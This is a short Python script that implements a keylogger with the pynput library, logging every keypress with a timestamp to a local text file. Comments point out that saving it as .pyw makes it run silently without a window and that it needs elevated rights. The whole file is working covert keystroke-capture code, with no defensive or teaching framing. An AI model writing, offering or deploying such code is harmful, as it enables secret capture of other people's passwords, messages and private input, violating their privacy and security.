# *.pyw files execute silently, no windows pop up

# curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
# python get-pip.py

# pip install pynput

from pynput.keyboard import Key, Listener
import logging

#log_dir = "~/code/"
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, \
                    format='%(asctime)s: %(message)s')

def on_press(key):
    # Need to run as SUDO to get meaningful information
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
